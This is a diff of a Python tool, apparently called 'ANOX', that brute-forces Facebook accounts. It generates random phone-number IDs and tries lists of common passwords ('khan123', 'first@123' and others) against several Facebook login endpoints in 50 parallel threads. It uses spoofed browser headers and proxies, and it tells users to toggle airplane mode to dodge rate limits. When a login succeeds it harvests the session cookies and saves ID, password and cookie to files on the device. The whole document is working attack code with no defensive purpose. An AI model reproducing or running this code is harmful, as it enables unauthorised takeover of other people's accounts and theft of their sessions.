-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	os.system("clear")
-	print(logo)
-	passx = int(input("[*] Enter Password Limit : "))
-	HamiiID = []
-	print("")
-	for bilal in range(passx):
-		pww = input("[*] Enter Password : ")
-		HamiiID.append(pww)
-	os.system("clear")
-	print(logo)
-	print("                CHOOSE METHOD                       ")
-	print(49*'=')
-	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
-	print(49*'=')
-	anoXfire = input("[+] [CHOOSE] :- ")
-	os.system("clear")
-	print(logo)
-	print("                TRY SOMETHING NEW                       ")
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("[+]==============================================")
-	anoXlovesyou = input("[+] [CHOOSE] :- ")
-	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anoX_xd.append('y')
-	else:
-		anoX_xd.append('n')
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("[+]==============================================")
-	anoXtop = input("[+] [CHOOSE] :- ")
-	if anoXtop in ['y','Y','Yes','YES','1']:
-		baby.append('y')
-	else:
-		baby.append('n')
-	
-	with ThreadPool(max_workers=50) as manshera:
-		os.system("clear")
-		print(logo)
-		tl = str(len(user))
-		print(f"[+] CODE CHOOSED : "+code)
-		print(f"[+] TOTAL IDZ : "+tl+" ")
-		print(f'[+] METHOD CHOOSED : M{anoXfire}')
-		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
-		for love in user:
-			pwx = [love[1:]]
-			uid = code+love
-			for Eman in HamiiID:
-				pwx.append(Eman)
-			if anoXfire =='1':manshera.submit(mbasic,uid,pwx,tl)
-			elif anoXfire =='2':manshera.submit(p,uid,pwx,tl)
-			elif anoXfire =='3':manshera.submit(x,uid,pwx,tl)
-			elif anoXfire =='4':manshera.submit(mobile,uid,pwx,tl)
-			elif anoXfire =='5':manshera.submit(freeq,uid,pwx,tl)
-			elif anoXfire =='6':manshera.submit(d,uid,pwx,tl)
-			else:
-			    manshera.submit(p,uid,pwx,tl)
-			
-
-
-
-def anoX6():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
+	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
 	print(47*'-')
-	kode = input('[?] Input Code : ')
-	print(47*'-')
-	limit = int(input('[?] How many numbers do you want to add : '))
+	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(6))
 		user.append(nmp)
 	os.system("clear")
 	print(logo)
 	print("                CHOOSE METHOD                       ")
-	print("[+]==============================================")
-	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
+	print("[+]════════════════════════════════════") 
+	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
 	print(49*'=')
-	anoXfire = input("[+] [CHOOSE] :- ")
+	ANOXfire = input("[+] [CHOOSE] :- ")
+	os.system("clear")
+	print(logo)
+	print("                CHOOSE METHOD                       ")
+	print("\033[1;37m [💚]════════════════════════════════════") 
+	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;37m [2] METHOD 2- P\n\033[1;33m [3] METHOD 3- X\n\033[1;92m [4] METHOD 4- MOBILE\033[1;92m [5] METHOD 5- FREE\n")
+	print(49*'=')
+	ANOXfire = input("\033[1;37m [+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("[+]==============================================")
-	anoXlovesyou = input("[+] [CHOOSE] :- ")
-	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anoX_xd.append('y')
+	print("\033[1;37m [💚]════════════════════════════════════") 
+	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
+	print("\033[1;37m [🥀]════════════════════════════════════") 
+	ANOXlovesyou = input("\033[1;36m[+] [CHOOSE] :- ")
+	if ANOXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		ANOX_xd.append('y')
 	else:
-		anoX_xd.append('n')
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("[+]==============================================")
-	anoXtop = input("[+] [CHOOSE] :- ")
-	if anoXtop in ['y','Y','Yes','YES','1']:
+		ANOX_xd.append('n')
+	print("\033[1;37m [😊]════════════════════════════════════") 
+	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
+	print("\033[1;37m [😊]════════════════════════════════════") 
+	ANOXtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
+	if ANOXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1611,28 +1566,32 @@ def anoX6():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(f"[+] TOTAL IDZ  : "+tl+" ")
-		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anoXfire}')
+		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
+		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
+		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{ANOXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
-			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
+			pwx = [kode+guru,mk,'khankhan','khan123','khan1122','first last','first123','last786','khan786','khan12345,''first@123','first1122','musa123','mohammad123','firstlast1122','first987','first@1234','First Last','firstlast12345','firstlast786']
+			if ANOXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif ANOXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif ANOXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif ANOXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif ANOXfire =='5':yaari.submit(fre,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
+	print('[✓] CRACKING COMPLETED ')
+	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	print('[?] Ids saved in ANOX.txt,ANOX-CP.txt')
+	input("DO YOU WANT TO GO BSCK MENU ")
+	ANOX()
 	print(47*"-")
+
+
 
 
 def mbasic(uid,pwx,tl):
@@ -1657,61 +1616,56 @@ def mbasic(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'mbasic.facebook.com',
+			header_freefb = {'Host': 'mbasic.facebook.com',
     'method':'POST',
     'scheme':'https',
-    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
-    'accept-encoding':'gzip, deflate, br',
-    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
-    'cache-control':'max-age=0',
-    'content-length':'171',
-    'content-type':'application/x-www-form-urlencoded',
-    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
-    'sec-ch-ua-mobile':'?1',
-    'sec-ch-ua-platform':'"Windows"',
-    'sec-fetch-dest':'document',
-    'sec-fetch-mode':'navigate',
-    'sec-fetch-site':'same-origin',
-    'sec-fetch-user':'?1',
-    'cache-control':'private, no-cache, no-store, must-revalidate',
-    'pragma':'no-cache',
-    'priority':'u=0',
-    'upgrade-insecure-requests':'1',
-			'user-agent': pro}
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
 			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anoX_xd:
+				print('\33[1;92m[ANOX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in ANOX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M1-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M1-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1740,61 +1694,56 @@ def p(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
+			header_freefb = {'Host': 'p.facebook.com',
     'method':'POST',
     'scheme':'https',
-    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
-    'accept-encoding':'gzip, deflate, br',
-    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
-    'cache-control':'max-age=0',
-    'content-length':'171',
-    'content-type':'application/x-www-form-urlencoded',
-    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
-    'sec-ch-ua-mobile':'?1',
-    'sec-ch-ua-platform':'"Windows"',
-    'sec-fetch-dest':'document',
-    'sec-fetch-mode':'navigate',
-    'sec-fetch-site':'same-origin',
-    'sec-fetch-user':'?1',
-    'cache-control':'private, no-cache, no-store, must-revalidate',
-    'pragma':'no-cache',
-    'priority':'u=0',
-    'upgrade-insecure-requests':'1',
-			'user-agent': pro}
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anoX_xd:
+				print('\33[1;92m[ANOX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in ANOX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-OK.txt', 'a').write(cid+' | '+ps+'|'+coki+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M2-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M2-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1810,7 +1759,7 @@ def x(uid,pwx,tl):
 			proxs= {'http': 'socks4://'+nip}
 			session = requests.Session()
 			pro = random.choice(ugen)
-			free_fb = session.get('https://x.facebook.com').text
+			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1821,61 +1770,61 @@ def x(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'x.facebook.com',
-    'method':'POST',
-    'scheme':'https',
-    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
-    'accept-encoding':'gzip, deflate, br',
-    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
-    'cache-control':'max-age=0',
-    'content-length':'171',
-    'content-type':'application/x-www-form-urlencoded',
-    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
-    'sec-ch-ua-mobile':'?1',
-    'sec-ch-ua-platform':'"Windows"',
-    'sec-fetch-dest':'document',
-    'sec-fetch-mode':'navigate',
-    'sec-fetch-site':'same-origin',
-    'sec-fetch-user':'?1',
-    'cache-control':'private, no-cache, no-store, must-revalidate',
-    'pragma':'no-cache',
-    'priority':'u=0',
-    'upgrade-insecure-requests':'1',
-			'user-agent': pro}
-			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			header_freefb = {'Host': 'free.facebook.com',
+            'method':'POST',
+            'scheme':'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X680D"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',}
+			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anoX_xd:
+				print('\33[1;92m[ANOX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in ANOX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
-					cek_apk(session,coki)
+					
 				else:
 					break
-				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M3-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M2-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1902,67 +1851,64 @@ def mobile(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'m.facebook.com',
-    'method':'POST',
-    'scheme':'https',
-    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
-    'accept-encoding':'gzip, deflate, br',
-    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
-    'cache-control':'max-age=0',
-    'content-length':'171',
-    'content-type':'application/x-www-form-urlencoded',
-    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
-    'sec-ch-ua-mobile':'?1',
-    'sec-ch-ua-platform':'"Windows"',
-    'sec-fetch-dest':'document',
-    'sec-fetch-mode':'navigate',
-    'sec-fetch-site':'same-origin',
-    'sec-fetch-user':'?1',
-    'cache-control':'private, no-cache, no-store, must-revalidate',
-    'pragma':'no-cache',
-    'priority':'u=0',
-    'upgrade-insecure-requests':'1',
-			'user-agent': pro}
+			header_freefb = {'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X680D"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POCO F1 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',}
 			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anoX_xd:
-					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
+				print('\r\033[1;32m[ANOX-OK]\033[1;37m'+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
+				if 'y' in ANOX_xd:
+					print("\33[1;93m[🥵] \33[1;97m[NUMBER ]: \33[1;96m"+uid)
+					print("\33[1;93m[😎] \33[1;92m[COOKIES ]: \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M4-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M4-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
 
-
-def freeq(uid,pwx,tl):
+def free(uid,pwx,tl):
 	global loop
 	global oks
 	global cps
@@ -1984,61 +1930,59 @@ def freeq(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'free.facebook.com',
-    'method':'POST',
-    'scheme':'https',
-    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
-    'accept-encoding':'gzip, deflate, br',
-    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
-    'cache-control':'max-age=0',
-    'content-length':'171',
-    'content-type':'application/x-www-form-urlencoded',
-    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
-    'sec-ch-ua-mobile':'?1',
-    'sec-ch-ua-platform':'"Windows"',
-    'sec-fetch-dest':'document',
-    'sec-fetch-mode':'navigate',
-    'sec-fetch-site':'same-origin',
-    'sec-fetch-user':'?1',
-    'cache-control':'private, no-cache, no-store, must-revalidate',
-    'pragma':'no-cache',
-    'priority':'u=0',
-    'upgrade-insecure-requests':'1',
-			'user-agent': pro}
+			header_freefb = {'authority': 'free.facebook.com/',			
+            'method': 'POST',         
+			'scheme': 'https',			
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'save-data': 'on',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"vivo 1901"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',}
 			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anoX_xd:
+				print('\33[1;92m[ANOX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in ANOX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
-					cek_apk(session,coki)
-				else:
-					break
-				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
+					
+				open('/sdcard/ANOX-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[ANOX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+'|'+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/ANOX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M5-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M5-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -2065,63 +2009,63 @@ def d(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'d.facebook.com',
-    'method':'POST',
